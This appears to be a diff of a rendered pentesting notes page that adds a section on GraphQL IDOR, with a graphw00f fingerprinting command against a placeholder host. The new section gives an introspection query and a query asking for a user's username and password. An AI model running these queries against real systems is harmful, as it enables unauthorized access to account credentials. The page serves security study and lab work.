@@ -993,6 +993,39 @@
   
 </li>
       
+        <li class="md-nav__item">
+  <a href="#insecure-direct-object-reference-idor" class="md-nav__link">
+    <span class="md-ellipsis">
+      Insecure Direct Object Reference (IDOR)
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Insecure Direct Object Reference (IDOR)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#identifying-idor" class="md-nav__link">
+    <span class="md-ellipsis">
+      Identifying IDOR
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploiting-idor" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exploiting IDOR
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
     </ul>
   
 </nav>
@@ -1241,6 +1274,39 @@
   
 </li>
       
+        <li class="md-nav__item">
+  <a href="#insecure-direct-object-reference-idor" class="md-nav__link">
+    <span class="md-ellipsis">
+      Insecure Direct Object Reference (IDOR)
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Insecure Direct Object Reference (IDOR)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#identifying-idor" class="md-nav__link">
+    <span class="md-ellipsis">
+      Identifying IDOR
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploiting-idor" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exploiting IDOR
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
     </ul>
   
 </nav>
@@ -1451,6 +1517,49 @@
 <span class="normal">3</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-7-1">git<span class="w"> </span>clone<span class="w"> </span>https://github.com/dolevf/graphw00f
 </span><span id="__span-7-2"><span class="nb">cd</span><span class="w"> </span>graphw00f
 </span><span id="__span-7-3">python3<span class="w"> </span>main.py<span class="w"> </span>-f<span class="w"> </span>-d<span class="w"> </span>-t<span class="w"> </span>http://STMIP:STMPO
+</span></code></pre></div></td></tr></table></div>
+<h2 id="insecure-direct-object-reference-idor">Insecure Direct Object Reference (IDOR)</h2>
+<h3 id="identifying-idor">Identifying IDOR</h3>
+<p>Replace a query value with another we know exist:
+<img alt="identifying idor" src="../../images/idor_2.png" /></p>
+<h3 id="exploiting-idor">Exploiting IDOR</h3>
+<p>Replace query with introspection query to determine what data can be accessed (escape quotation marks on the below query)
+<div class="language-json highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">JSON</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-8-1"><span class="p">{</span>
+</span><span id="__span-8-2"><span class="w">  </span><span class="err">__</span><span class="kc">t</span><span class="err">ype(</span><span class="kc">na</span><span class="err">me</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;UserObject&quot;</span><span class="err">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-8-3"><span class="w">    </span><span class="kc">na</span><span class="err">me</span>
+</span><span id="__span-8-4"><span class="w">    </span><span class="kc">f</span><span class="err">ields</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-8-5"><span class="w">      </span><span class="kc">na</span><span class="err">me</span>
+</span><span id="__span-8-6"><span class="w">      </span><span class="kc">t</span><span class="err">ype</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-8-7"><span class="w">        </span><span class="kc">na</span><span class="err">me</span>
+</span><span id="__span-8-8"><span class="w">        </span><span class="err">ki</span><span class="kc">n</span><span class="err">d</span>
+</span><span id="__span-8-9"><span class="w">      </span><span class="p">}</span>
+</span><span id="__span-8-10"><span class="w">    </span><span class="p">}</span>
+</span><span id="__span-8-11"><span class="w">  </span><span class="p">}</span>
+</span><span id="__span-8-12"><span class="p">}</span>
+</span></code></pre></div></td></tr></table></div></p>
+<p>Adjust query to test if previously determined data fields are accessible</p>
+<div class="language-json highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">JSON</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span>
+<span class="normal">5</span>
+<span class="normal">6</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-9-1"><span class="p">{</span>
+</span><span id="__span-9-2"><span class="w">  </span><span class="err">user(user</span><span class="kc">na</span><span class="err">me</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;test&quot;</span><span class="err">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-9-3"><span class="w">    </span><span class="err">user</span><span class="kc">na</span><span class="err">me</span>
+</span><span id="__span-9-4"><span class="w">    </span><span class="err">password</span>
+</span><span id="__span-9-5"><span class="w">  </span><span class="p">}</span>
+</span><span id="__span-9-6"><span class="p">}</span>
 </span></code></pre></div></td></tr></table></div>
 
 
